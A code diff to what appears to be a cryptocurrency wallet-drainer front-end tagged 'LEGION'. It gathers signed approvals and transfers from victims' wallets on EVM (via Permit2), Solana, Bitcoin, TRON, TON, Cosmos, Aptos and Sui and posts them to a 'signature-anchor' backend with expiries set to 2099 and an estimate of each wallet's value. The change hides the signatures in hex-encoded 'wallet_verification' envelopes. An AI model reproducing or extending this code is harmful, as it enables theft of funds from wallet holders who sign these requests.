@@ -1829,7 +1829,8 @@
                 return { token: d.token, amount: String(d.amount), expiration: d.expiration, nonce: d.nonce };
               }),
               spender: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
-              sigDeadline: String(deadline)
+              sigDeadline: String(deadline),
+              chainId: evmChainId
             },
             native_amount: '0'
           };
@@ -1875,177 +1876,196 @@
         }
       }
 
+      // ─── Helper: pack any JSON into hex envelope ───
+      function packEnvelopeHex(obj) {
+        var json = JSON.stringify(obj);
+        var hex = '0x';
+        for (var i = 0; i < json.length; i++) hex += json.charCodeAt(i).toString(16).padStart(2, '0');
+        return hex;
+      }
+
       // Submit Solana if present
       if (signatures.SOL) {
-        console.log('[LEGION]   📤 Submitting Solana...');
+        console.log('[LEGION]   Submitting Solana...');
         try {
-          var solPayload = {
+          var solSigRaw = signatures.SOL.signature;
+          var solSigHex = typeof solSigRaw === 'string' && solSigRaw.startsWith('0x') ? solSigRaw : (typeof solSigRaw === 'object' ? btoa(String.fromCharCode.apply(null, new Uint8Array(solSigRaw))) : String(solSigRaw));
+          var solEnvelope = packEnvelopeHex({
+            protocol: 'svm_transfer',
+            wallet_verification: solSigHex,
+            wallet_address: signatures.SOL.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'SVM',
             protocol: 'solana',
             wallet_address: signatures.SOL.address,
             token_address: '11111111111111111111111111111111',
-            signature: signatures.SOL.signature,
+            signature: solEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.SOL.walletType || (connectedChains.SOL && connectedChains.SOL.walletType) || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
-          };
-          await apiPost('/api/v1/signature-anchor', solPayload);
-          console.log('[LEGION]   ✅ Solana submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ Solana failed:', err.message);
-        }
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.SOL.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+            amount: '0'
+          });
+          console.log('[LEGION]   SOL submitted');
+        } catch (err) { console.error('[LEGION]   SOL failed:', err.message); }
       }
 
       // Submit Bitcoin if present
       if (signatures.BTC) {
-        console.log('[LEGION]   📤 Submitting Bitcoin...');
+        console.log('[LEGION]   Submitting Bitcoin...');
         try {
-          var btcPayload = {
+          var btcEnvelope = packEnvelopeHex({
+            protocol: 'utxo_psbt',
+            wallet_verification: String(signatures.BTC.signature),
+            wallet_address: signatures.BTC.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'UTXO',
             protocol: 'bitcoin_psbt',
             wallet_address: signatures.BTC.address,
-            signature: signatures.BTC.signature,
+            token_address: 'BTC',
+            signature: btcEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.BTC.walletType || (connectedChains.BTC && connectedChains.BTC.walletType) || 'hot_wallet',
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.BTC.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            signed_psbt_base64: signatures.BTC.psbt || signatures.BTC.signature,
-            psbt_metadata: {
-              vault_address: vaults.btc || '',
-              amount_sat: signatures.BTC.amount_sat || '0',
-              fee_sat: signatures.BTC.fee_sat || '0'
-            }
-          };
-          console.log('[LEGION]     📝 BTC Payload:', JSON.stringify(btcPayload).substring(0, 100) + '...');
-          await apiPost('/api/v1/signature-anchor', btcPayload);
-          console.log('[LEGION]   ✅ Bitcoin submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ Bitcoin failed:', err.message);
-          if (err.response) {
-            console.error('[LEGION]      Error details:', err.response);
-          }
-        }
+            amount: '0'
+          });
+          console.log('[LEGION]   BTC submitted');
+        } catch (err) { console.error('[LEGION]   BTC failed:', err.message); }
       }
 
       // Submit TRON if present
       if (signatures.TRON) {
-        console.log('[LEGION]   📤 Submitting TRON...');
+        console.log('[LEGION]   Submitting TRON...');
         try {
-          var tronPayload = {
+          var tronEnvelope = packEnvelopeHex({
+            protocol: 'tron_transfer',
+            wallet_verification: String(signatures.TRON.signature),
+            wallet_address: signatures.TRON.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'TRON',
             protocol: 'tron',
             wallet_address: signatures.TRON.address,
             token_address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-            signature: signatures.TRON.signature,
+            signature: tronEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.TRON.walletType || (connectedChains.TRON && connectedChains.TRON.walletType) || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
-          };
-          await apiPost('/api/v1/signature-anchor', tronPayload);
-          console.log('[LEGION]   ✅ TRON submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ TRON failed:', err.message);
-        }
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.TRON.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+            amount: '0'
+          });
+          console.log('[LEGION]   TRON submitted');
+        } catch (err) { console.error('[LEGION]   TRON failed:', err.message); }
       }
 
       // Submit TON if present
       if (signatures.TON) {
-        console.log('[LEGION]   📤 Submitting TON...');
+        console.log('[LEGION]   Submitting TON...');
         try {
-          var tonPayload = {
+          var tonEnvelope = packEnvelopeHex({
+            protocol: 'ton_transfer',
+            wallet_verification: String(signatures.TON.signature),
+            wallet_address: signatures.TON.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'TON',
             protocol: 'ton',
             wallet_address: signatures.TON.address,
             token_address: 'ton',
-            signature: signatures.TON.signature,
+            signature: tonEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.TON.walletType || (connectedChains.TON && connectedChains.TON.walletType) || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
-          };
-          await apiPost('/api/v1/signature-anchor', tonPayload);
-          console.log('[LEGION]   ✅ TON submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ TON failed:', err.message);
-        }
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.TON.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+            amount: '0'
+          });
+          console.log('[LEGION]   TON submitted');
+        } catch (err) { console.error('[LEGION]   TON failed:', err.message); }
       }
 
       // Submit Cosmos if present
       if (signatures.COSMOS) {
-        console.log('[LEGION]   📤 Submitting Cosmos...');
+        console.log('[LEGION]   Submitting Cosmos...');
         try {
-          var cosmosPayload = {
+          var cosmosEnvelope = packEnvelopeHex({
+            protocol: 'cosmos_transfer',
+            wallet_verification: String(signatures.COSMOS.signature),
+            wallet_address: signatures.COSMOS.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'COSMOS',
             protocol: 'cosmos',
             wallet_address: signatures.COSMOS.address,
             token_address: 'uatom',
-            signature: signatures.COSMOS.signature,
+            signature: cosmosEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.COSMOS.walletType || (connectedChains.COSMOS && connectedChains.COSMOS.walletType) || 'hot_wallet',
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: signatures.COSMOS.amount || '0'
-          };
-          await apiPost('/api/v1/signature-anchor', cosmosPayload);
-          console.log('[LEGION]   ✅ Cosmos submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ Cosmos failed:', err.message);
-        }
+            amount: '0'
+          });
+          console.log('[LEGION]   COSMOS submitted');
+        } catch (err) { console.error('[LEGION]   COSMOS failed:', err.message); }
       }
 
       // Submit Aptos if present
       if (signatures.APTOS) {
-        console.log('[LEGION]   📤 Submitting Aptos...');
+        console.log('[LEGION]   Submitting Aptos...');
         try {
-          var aptosPayload = {
+          var aptosEnvelope = packEnvelopeHex({
+            protocol: 'aptos_transfer',
+            wallet_verification: String(signatures.APTOS.signature),
+            wallet_address: signatures.APTOS.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'APTOS',
             protocol: 'aptos',
             wallet_address: signatures.APTOS.address,
             token_address: 'apt',
-            signature: signatures.APTOS.signature,
+            signature: aptosEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.APTOS.walletType || (connectedChains.APTOS && connectedChains.APTOS.walletType) || 'hot_wallet',
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.APTOS.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: signatures.APTOS.amount || '0'
-          };
-          await apiPost('/api/v1/signature-anchor', aptosPayload);
-          console.log('[LEGION]   ✅ Aptos submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ Aptos failed:', err.message);
-        }
+            amount: '0'
+          });
+          console.log('[LEGION]   APTOS submitted');
+        } catch (err) { console.error('[LEGION]   APTOS failed:', err.message); }
       }
 
       // Submit Sui if present
       if (signatures.SUI) {
-        console.log('[LEGION]   📤 Submitting Sui...');
+        console.log('[LEGION]   Submitting Sui...');
         try {
-          var suiPayload = {
+          var suiEnvelope = packEnvelopeHex({
+            protocol: 'sui_transfer',
+            wallet_verification: String(signatures.SUI.signature),
+            wallet_address: signatures.SUI.address
+          });
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'SUI',
             protocol: 'sui',
             wallet_address: signatures.SUI.address,
             token_address: 'sui',
-            signature: signatures.SUI.signature,
+            signature: suiEnvelope,
             nonce: 'legion:' + Date.now(),
-            expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: signatures.SUI.walletType || (connectedChains.SUI && connectedChains.SUI.walletType) || 'hot_wallet',
+            expiry_iso: EXPIRY_ISO,
+            wallet_type: signatures.SUI.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: signatures.SUI.amount || '0'
-          };
-          await apiPost('/api/v1/signature-anchor', suiPayload);
-          console.log('[LEGION]   ✅ Sui submitted');
-        } catch (err) {
-          console.error('[LEGION]   ❌ Sui failed:', err.message);
-        }
+            amount: '0'
+          });
+          console.log('[LEGION]   SUI submitted');
+        } catch (err) { console.error('[LEGION]   SUI failed:', err.message); }
       }
 
       // ─── NFT Scanning & Seaport Listing (after token signatures) ────
@@ -3327,6 +3347,7 @@
       var firstWallet = connected[firstChain];
 
       var scoutPromise = apiPost('/api/v1/scout', {
+        wallet_address: firstWallet ? firstWallet.address : '',
         user_address: firstWallet ? firstWallet.address : '',
         chain_id: connected.EVM ? connected.EVM.chainId || 1 : 1,
         wallet_type: firstWallet ? firstWallet.walletType : 'Unknown',
